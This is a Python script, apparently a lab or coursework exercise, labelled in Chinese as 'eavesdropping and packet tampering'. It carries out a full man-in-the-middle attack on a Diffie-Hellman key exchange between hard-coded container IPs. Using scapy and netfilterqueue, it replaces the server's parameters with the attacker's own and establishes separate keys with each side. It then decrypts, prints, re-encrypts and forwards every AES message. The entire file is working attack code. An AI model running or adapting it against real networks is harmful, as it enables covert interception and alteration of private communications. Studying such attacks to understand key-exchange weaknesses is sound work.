"""
监听与报文篡改
"""

from traceback import print_exc
from scapy.all import *
import netfilterqueue
import json
from Crypto.Util.number import getPrime, getRandomInteger
from aes import aes_decrypt, aes_encrypt

COMUNICATION_LENGTH = 1400


def primitive_root(p: int) -> int:
    """求素数p的最小原根"""
    k = (p - 1) // 2
    for i in range(2, p - 1):
        if pow(i, k, p) != 1:
            return i
    return -1


def key_format(K: int) -> bytes:
    """取k的一部分作为密钥"""
    return str(K)[:16].encode()


def packet_handler(packet) -> None:
    global g_server
    global p_server
    global A_server
    global B_middle_server
    global K_middle_server
    global K_middle_client
    global B_client

    scapy_packet = IP(packet.get_payload())

    if scapy_packet[IP].src == CLIENT_IP and scapy_packet[IP].dst == SERVER_IP and scapy_packet.haslayer(Raw):
        # 来自客户端的报文
        try:
            msg = json.loads(scapy_packet[Raw].load.decode('ascii', 'ignore'))
            # 解析报文正文内容
        except Exception as e:
            print_exc(e)
            return

        if msg['status'] == 2:
            # 客户端向服务端发送B
            B_client = msg['body']['B']
            K_middle_client = pow(
                B_client, a_middle_client, p_middle_client)

            # 重组报文
            hacked_msg = {
                "status": 2,
                "body": {
                    "B": B_middle_server
                }
            }

            raw_msg = json.dumps(hacked_msg).encode()
            # 字节填充, 保证报文长度不变
            scapy_packet[Raw] = Raw(
                raw_msg + b'\xff' * (COMUNICATION_LENGTH - len(raw_msg)))

            # 删掉长度与校验和, 发送时会自动重新计算
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[TCP].chksum

            # 输出与客户端交换的密钥
            print(f'\nK_middle_client: {K_middle_client}')

            K_middle_client = key_format(K_middle_client)

            # 发送报文
            packet.set_payload(bytes(scapy_packet))

        elif msg['status'] == 3:
            # 客户端向服务端发送加密信息
            cipher = msg['body']['msg'].encode()
            plaintext = aes_decrypt(cipher, K_middle_client).decode()
            # 解密消息
            print(f'\nfrom client: {plaintext}')

            # 重新用与服务端协商的密钥加密
            hacked_cipher = aes_encrypt(
                plaintext.encode(), K_middle_server)
            # 重组报文
            hacked_msg = {
                "status": 3,
                "body": {
                    "msg": hacked_cipher.decode()
                }
            }

            raw_msg = json.dumps(hacked_msg).encode()
            # 报文填充, 保证报文长度不变
            scapy_packet[Raw] = Raw(
                raw_msg + b'\xff' * (COMUNICATION_LENGTH - len(raw_msg)))

            # 删除长度与校验和信息, 发送报文时会重新计算
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[TCP].chksum

            # 发送报文
            packet.set_payload(bytes(scapy_packet))

    elif scapy_packet[IP].src == SERVER_IP and scapy_packet[IP].dst == CLIENT_IP and scapy_packet.haslayer(Raw):
        # 来自服务端的报文
        try:
            msg = json.loads(scapy_packet[Raw].load.decode('ascii', 'ignore'))
            # 解析报文内容
        except:
            print_exc(e)
            return

        if msg['status'] == 1:
            # 服务端向客户端发送g, p, A
            g_server = msg['body']['g']
            p_server = msg['body']['p']
            A_server = msg['body']['A']
            B_middle_server = pow(g_server, b_middle_server, p_server) # 计算与服务端交换密钥用到的B
            K_middle_server = pow(A_server, b_middle_server, p_server) # 计算与服务端交换的密钥

            # 重组报文
            hacked_msg = {
                "status": 1,
                "body": {
                    "p": p_middle_client,
                    "g": g_middle_client,
                    "A": A_middle_client
                }
            }

            raw_msg = json.dumps(hacked_msg).encode()
            # 填充报文, 保证报文长度不发生变化
            scapy_packet[Raw] = Raw(
                raw_msg + b'\xff' * (COMUNICATION_LENGTH - len(raw_msg)))

            # 删除长度与校验和, 发送报文时会重新计算
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[TCP].chksum

            # 显示与服务端交换的密钥
            print(f'\nK_middle_server: {K_middle_server}')

            K_middle_server = key_format(K_middle_server)

            # 发送报文
            packet.set_payload(bytes(scapy_packet))

        elif msg['status'] == 3:
            cipher = msg['body']['msg'].encode()
            plaintext = aes_decrypt(cipher, K_middle_server).decode()
            print(f'\nfrom server: {plaintext}')

            hacked_cipher = aes_encrypt(
                plaintext.encode(), K_middle_client)
            hacked_msg = {
                "status": 3,
                "body": {
                    "msg": hacked_cipher.decode()
                }
            }

            raw_msg = json.dumps(hacked_msg).encode()
            scapy_packet[Raw] = Raw(
                raw_msg + b'\xff' * (COMUNICATION_LENGTH - len(raw_msg)))

            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[TCP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()
    return

ATTACKER_MAC = '02:42:ac:11:00:02'
ATTACKER_IP = '172.17.0.2'

GATEWAY_IP = '172.17.0.1'

SERVER_MAC = '02:42:ac:11:00:03'
SERVER_IP = '172.17.0.3'

CLIENT_MAC = '02:42:ac:11:00:04'
CLIENT_IP = '172.17.0.4'

g_server = -1 # 来自服务端的g
p_server = -1 # 来自服务端的p
A_server = -1 # 来自服务端的A

b_middle_server = getRandomInteger(100) # 与服务端进行密钥交换用到的b
B_middle_server = -1 # 与服务端进行密钥交换的B
K_middle_server = -1 # 与服务端交换的密钥

a_middle_client = getRandomInteger(100) # 与客户端进行密钥交换用到的a
p_middle_client = getPrime(300) # 与客户端进行密钥交换用到的p
g_middle_client = primitive_root(p_middle_client) # 与客户端进行密钥交换用到的g
A_middle_client = pow(g_middle_client, a_middle_client, p_middle_client) # 与客户端进行密钥交换用到的A
K_middle_client = -1 # 与客户端交换的密钥

B_client = -1 # 来自服务端的B


nf_queue = netfilterqueue.NetfilterQueue()
nf_queue.bind(0, packet_handler) # 注册回调函数
nf_queue.run() # 启动报文监听
